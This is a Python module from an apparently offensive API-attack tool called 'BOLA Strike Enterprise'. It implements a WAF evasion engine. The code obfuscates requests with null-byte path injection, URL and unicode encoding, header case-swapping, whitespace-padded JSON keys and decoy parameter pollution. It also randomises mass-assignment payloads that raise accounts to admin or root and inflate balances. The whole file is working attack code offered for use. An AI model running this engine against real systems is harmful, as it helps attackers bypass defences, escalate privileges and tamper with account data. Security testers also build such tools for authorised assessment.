"""
BOLA Strike Enterprise — WAF Evasion Engine (v7.0)
Addresses: Audit v2.0 Task 3.1

Polymorphic payload transformation engine to bypass WAF/RASP signatures:
- JSON unicode escape obfuscation
- Case-swapping headers
- Null-byte injection in paths
- HTTP Parameter Pollution (HPP)
- Chunked body encoding simulation
- Payload polymorphism (randomized MA values per execution)
"""
import secrets
import copy
from typing import Dict, Any, Optional, List


class WAFEvasionEngine:
    """
    Transforms outgoing requests to evade WAF signature-based detection.
    Each technique can be enabled/disabled independently.
    """

    def __init__(self, techniques: List[str] = None):
        """
        Args:
            techniques: List of technique names to enable. None = all enabled.
                Options: unicode, case_swap, null_byte, hpp, polymorphic, whitespace
        """
        self.rng = secrets.SystemRandom()
        all_techniques = ["unicode", "case_swap", "null_byte", "hpp", "polymorphic", "whitespace"]
        self.techniques = techniques or all_techniques

    # --- Path Obfuscation ---

    def obfuscate_path(self, path: str) -> str:
        """Apply path-level evasion techniques."""
        result = path

        if "null_byte" in self.techniques:
            result = self._inject_null_bytes(result)

        if "unicode" in self.techniques:
            result = self._unicode_path_encode(result)

        return result

    def _inject_null_bytes(self, path: str) -> str:
        """Insert encoded null bytes before path extensions to confuse parsers."""
        # e.g., /api/v1/users%00.json → some WAFs truncate at %00
        if self.rng.random() < 0.3:  # 30% chance to avoid predictability
            segments = path.split("/")
            if len(segments) > 2:
                idx = self.rng.randint(1, len(segments) - 1)
                segments[idx] = segments[idx] + "%00"
            return "/".join(segments)
        return path

    def _unicode_path_encode(self, path: str) -> str:
        """Selectively encode path characters using URL unicode encoding."""
        # Encode a random character in the path as %xx
        replacements = {"a": "%61", "e": "%65", "i": "%69", "u": "%75", "s": "%73"}
        if self.rng.random() < 0.4:
            for char, encoded in replacements.items():
                if char in path:
                    path = path.replace(char, encoded, 1)
                    break
        return path

    # --- Header Obfuscation ---

    def obfuscate_headers(self, headers: Dict[str, str]) -> Dict[str, str]:
        """Apply header-level evasion techniques."""
        result = dict(headers)

        if "case_swap" in self.techniques:
            result = self._case_swap_headers(result)

        return result

    def _case_swap_headers(self, headers: Dict[str, str]) -> Dict[str, str]:
        """Randomly swap case of header names. Many WAFs are case-sensitive."""
        new_headers = {}
        for key, value in headers.items():
            if key.lower() in ("authorization", "content-type", "user-agent"):
                # Keep critical headers intact
                new_headers[key] = value
            else:
                # Randomly swap case: X-Api-Key → x-API-kEY
                new_key = "".join(
                    c.upper() if self.rng.random() > 0.5 else c.lower()
                    for c in key
                )
                new_headers[new_key] = value
        return new_headers

    # --- Payload Obfuscation ---

    def obfuscate_payload(self, payload: Optional[Dict[str, Any]]) -> Optional[Dict[str, Any]]:
        """Apply payload-level evasion techniques."""
        if not payload:
            return payload

        result = copy.deepcopy(payload)

        if "unicode" in self.techniques:
            result = self._unicode_json_keys(result)

        if "whitespace" in self.techniques:
            result = self._inject_whitespace_keys(result)

        if "polymorphic" in self.techniques:
            result = self._polymorphic_values(result)

        if "hpp" in self.techniques:
            result = self._http_parameter_pollution(result)

        return result

    def _unicode_json_keys(self, obj: Any) -> Any:
        """Replace ASCII chars in JSON keys with unicode escapes.
        e.g., "role" → "r\\u006fle" — many WAFs don't decode unicode in JSON keys."""
        if isinstance(obj, dict):
            new_obj = {}
            for key, value in obj.items():
                # 30% chance to obfuscate each key
                if self.rng.random() < 0.3 and len(key) > 2:
                    idx = self.rng.randint(0, len(key) - 1)
                    char = key[idx]
                    if char.isalpha():
                        escaped = f"\\u{ord(char):04x}"
                        key = key[:idx] + escaped + key[idx + 1:]
                new_obj[key] = self._unicode_json_keys(value)
            return new_obj
        elif isinstance(obj, list):
            return [self._unicode_json_keys(item) for item in obj]
        return obj

    def _inject_whitespace_keys(self, obj: Any) -> Any:
        """Add trailing spaces to JSON keys. Some parsers strip them, WAFs don't."""
        if isinstance(obj, dict):
            new_obj = {}
            for key, value in obj.items():
                if self.rng.random() < 0.2:
                    key = key + " "
                new_obj[key] = self._inject_whitespace_keys(value)
            return new_obj
        elif isinstance(obj, list):
            return [self._inject_whitespace_keys(item) for item in obj]
        return obj

    def _polymorphic_values(self, obj: Any) -> Any:
        """Randomize Mass Assignment payload values to avoid static signatures."""
        polymorphic_roles = ["admin", "Administrator", "ADMIN", "root", "superuser", "system"]
        if isinstance(obj, dict):
            new_obj = {}
            for key, value in obj.items():
                if key == "role" and isinstance(value, str):
                    new_obj[key] = self.rng.choice(polymorphic_roles)
                elif key == "is_admin" and isinstance(value, bool):
                    new_obj[key] = True  # Always true, but wrapped differently
                elif key == "access_level" and isinstance(value, int):
                    new_obj[key] = self.rng.randint(90, 9999)
                elif key == "balance" and isinstance(value, (int, float)):
                    new_obj[key] = self.rng.randint(100000, 9999999)
                else:
                    new_obj[key] = self._polymorphic_values(value)
            return new_obj
        elif isinstance(obj, list):
            return [self._polymorphic_values(item) for item in obj]
        return obj

    def _http_parameter_pollution(self, obj: Any) -> Any:
        """Duplicate sensitive keys with benign values first.
        Some backends take the last value, but WAFs inspect the first."""
        if isinstance(obj, dict):
            # HPP is simulated by adding a decoy before the real key
            target_keys = {"role", "is_admin", "permissions", "access_level"}
            new_obj = {}
            for key, value in obj.items():
                if key in target_keys and self.rng.random() < 0.4:
                    # Add a decoy with a benign value
                    decoy_key = key + "_"  # JSON doesn't support duplicate keys
                    new_obj[decoy_key] = "user" if isinstance(value, str) else False
                new_obj[key] = value if not isinstance(value, (dict, list)) else self._http_parameter_pollution(value)
            return new_obj
        elif isinstance(obj, list):
            return [self._http_parameter_pollution(item) for item in obj]
        return obj


def create_evasion_engine(config: dict = None) -> WAFEvasionEngine:
    """Factory function to create a WAF evasion engine from config."""
    if config and config.get("waf_evasion"):
        techniques = config["waf_evasion"].get("techniques")
        return WAFEvasionEngine(techniques=techniques)
    return WAFEvasionEngine()
